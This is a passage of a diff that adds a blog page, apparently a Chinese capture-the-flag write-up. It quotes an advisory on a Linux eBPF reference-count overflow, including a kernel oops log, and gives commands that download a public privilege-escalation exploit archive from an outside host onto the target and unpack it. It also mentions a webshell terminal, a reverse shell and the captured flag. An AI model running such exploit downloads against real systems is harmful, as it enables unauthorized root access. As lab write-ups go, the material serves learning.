+</span></span><span style="display:flex;"><span>   container<span style="color:#960050;background-color:#1e0010">&#39;</span>s root user has access to 2^16 different UIDs. If an attacker
+</span></span><span style="display:flex;"><span>   has control over <span style="color:#ae81ff">9</span> containers and can share file descriptors between
+</span></span><span style="display:flex;"><span>   them or has control over one container with a relatively high number
+</span></span><span style="display:flex;"><span>   of mapped UIDs, he should be able to trigger the overflow.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The attached PoC, when run in a Ubuntu 16.04 VM with 40GB RAM and the
+</span></span><span style="display:flex;"><span>RLIMIT_MEMLOCK limit disabled, needs <span style="color:#ae81ff">25</span> minutes to execute and causes the
+</span></span><span style="display:flex;"><span>following oops:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676543<span style="color:#f92672">]</span> BUG: unable to handle kernel paging request at ffffc900069c5010
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676550<span style="color:#f92672">]</span> IP: <span style="color:#f92672">[</span>&lt;ffffffff81173525&gt;<span style="color:#f92672">]</span> bpf_prog_put_rcu+0x5/0x30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676556<span style="color:#f92672">]</span> PGD 9bc094067 PUD 9bc095067 PMD 9b4d2b067 PTE <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676558<span style="color:#f92672">]</span> Oops: <span style="color:#ae81ff">0000</span> <span style="color:#f92672">[</span><span style="color:#75715e">#1] SMP</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676561<span style="color:#f92672">]</span> Modules linked in: nls_utf8 isofs vboxsf<span style="color:#f92672">(</span>OE<span style="color:#f92672">)</span> snd_intel8x0 snd_ac97_codec ac97_bus snd_pcm snd_seq_midi snd_seq_midi_event joydev snd_rawmidi snd_seq snd_seq_device snd_timer input_leds snd serio_raw soundcore vboxvideo<span style="color:#f92672">(</span>OE<span style="color:#f92672">)</span> 8250_fintek drm i2c_piix4 vboxguest<span style="color:#f92672">(</span>OE<span style="color:#f92672">)</span> mac_hid parport_pc ppdev lp parport autofs4 hid_generic usbhid hid psmouse ahci libahci fjes video e1000 pata_acpi
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676579<span style="color:#f92672">]</span> CPU: <span style="color:#ae81ff">0</span> PID: <span style="color:#ae81ff">1861</span> Comm: overflow Tainted: G           OE   4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676581<span style="color:#f92672">]</span> Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676582<span style="color:#f92672">]</span> task: ffff8809b2fe4b00 ti: ffff8809b2f3c000 task.ti: ffff8809b2f3c000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676583<span style="color:#f92672">]</span> RIP: 0010:<span style="color:#f92672">[</span>&lt;ffffffff81173525&gt;<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff81173525&gt;<span style="color:#f92672">]</span> bpf_prog_put_rcu+0x5/0x30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676585<span style="color:#f92672">]</span> RSP: 0018:ffff8809b2f3fdb8  EFLAGS: <span style="color:#ae81ff">00010286</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676586<span style="color:#f92672">]</span> RAX: ffffffff81a24f20 RBX: <span style="color:#ae81ff">0000000000000000</span> RCX: <span style="color:#ae81ff">0000000000000001</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676587<span style="color:#f92672">]</span> RDX: ffff880230ebc110 RSI: ffff880230ebc100 RDI: ffffc900069c5000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676588<span style="color:#f92672">]</span> RBP: ffff8809b2f3fdc0 R08: <span style="color:#ae81ff">0000000000000000</span> R09: <span style="color:#ae81ff">0000000000000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676589<span style="color:#f92672">]</span> R10: ffff8809b55468e0 R11: ffff880230ebc110 R12: ffffc90814ce6060
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676590<span style="color:#f92672">]</span> R13: ffffc90814ce6000 R14: ffff8809b5a9d1a0 R15: ffff8809b29cf480
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676592<span style="color:#f92672">]</span> FS:  00007fbe54cf5700<span style="color:#f92672">(</span>0000<span style="color:#f92672">)</span> GS:ffff8809e3c00000<span style="color:#f92672">(</span>0000<span style="color:#f92672">)</span> knlGS:0000000000000000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676593<span style="color:#f92672">]</span> CS:  <span style="color:#ae81ff">0010</span> DS: <span style="color:#ae81ff">0000</span> ES: <span style="color:#ae81ff">0000</span> CR0: 000000008005003b
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676594<span style="color:#f92672">]</span> CR2: ffffc900069c5010 CR3: 00000009ae9ce000 CR4: 00000000000006f0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676598<span style="color:#f92672">]</span> Stack:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676599<span style="color:#f92672">]</span>  ffffffff8117810e ffff8809b2f3fde8 ffffffff811783c6 ffffc90814ce6000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676600<span style="color:#f92672">]</span>  <span style="color:#ae81ff">0000000000000008</span> ffff8809b55468e0 ffff8809b2f3fdf8 ffffffff811729bd
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676602<span style="color:#f92672">]</span>  ffff8809b2f3fe10 ffffffff811733b9 ffff880230ebc100 ffff8809b2f3fe58
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676603<span style="color:#f92672">]</span> Call Trace:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676607<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff8117810e&gt;<span style="color:#f92672">]</span> ? prog_fd_array_put_ptr+0xe/0x10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676609<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff811783c6&gt;<span style="color:#f92672">]</span> bpf_fd_array_map_clear+0x36/0x50
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676611<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff811729bd&gt;<span style="color:#f92672">]</span> bpf_map_put_uref+0x1d/0x20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676612<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff811733b9&gt;<span style="color:#f92672">]</span> bpf_map_release+0x19/0x30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676616<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff8120e514&gt;<span style="color:#f92672">]</span> __fput+0xe4/0x220
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676617<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff8120e68e&gt;<span style="color:#f92672">]</span> ____fput+0xe/0x10
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676621<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff8109e943&gt;<span style="color:#f92672">]</span> task_work_run+0x73/0x90
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676625<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff81083ba4&gt;<span style="color:#f92672">]</span> do_exit+0x2e4/0xae0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676626<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff81084423&gt;<span style="color:#f92672">]</span> do_group_exit+0x43/0xb0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676628<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff810844a4&gt;<span style="color:#f92672">]</span> SyS_exit_group+0x14/0x20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676632<span style="color:#f92672">]</span>  <span style="color:#f92672">[</span>&lt;ffffffff818244f2&gt;<span style="color:#f92672">]</span> entry_SYSCALL_64_fastpath+0x16/0x71
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676633<span style="color:#f92672">]</span> Code: cf <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> e5 <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">48</span> c7 <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">55</span> e6 <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">89</span> 3d 4a <span style="color:#ae81ff">20</span> cf <span style="color:#ae81ff">00</span> 5d c3 0f 1f <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">90</span> &lt;48&gt; 8b <span style="color:#ae81ff">47</span> <span style="color:#ae81ff">10</span> 3e ff <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">01</span> c3 <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">48</span> 8b 7f <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">48</span> c7 c6 <span style="color:#ae81ff">20</span> 2f <span style="color:#ae81ff">17</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676649<span style="color:#f92672">]</span> RIP  <span style="color:#f92672">[</span>&lt;ffffffff81173525&gt;<span style="color:#f92672">]</span> bpf_prog_put_rcu+0x5/0x30
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676650<span style="color:#f92672">]</span>  RSP &lt;ffff8809b2f3fdb8&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676651<span style="color:#f92672">]</span> CR2: ffffc900069c5010
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676653<span style="color:#f92672">]</span> ---<span style="color:#f92672">[</span> end trace 90333448b9273067 <span style="color:#f92672">]</span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 1850.676655<span style="color:#f92672">]</span> Fixing recursive fault but reboot is needed!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I believe that this issue illustrates that reference count hardening
+</span></span><span style="display:flex;"><span>makes sense, even without reference leaks.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A suggested patch <span style="color:#f92672">(</span>compile-tested<span style="color:#f92672">)</span> is attached.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Fixed in https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id<span style="color:#f92672">=</span>92117d8443bc5afacc8d5ba82e541946310f106e
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Proof of Concept:
+</span></span><span style="display:flex;"><span>https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39773.zip
+</span></span></code></pre></div><p>蚁剑终端里不知道为什么无法提权，反弹shell后实现提权：</p>
+<pre tabindex="0"><code>$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+$ unzip 39772.zip
+$ cd 39772
+$ tar -xvf refcount_overflow.tar
+$ cd ebpf_mapfd_doubleput_exploit
+</code></pre><p>the-flag.txt：</p>
+<pre tabindex="0"><code>cat /root/the-flag.txt
+ __        __   _ _   ____                   _ _ _ _ 
+ \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
+   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+                                                     
+
+Congratulations are in order.  :-)
+
+I hope you&#39;ve enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+
+Have a great day!!!!
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
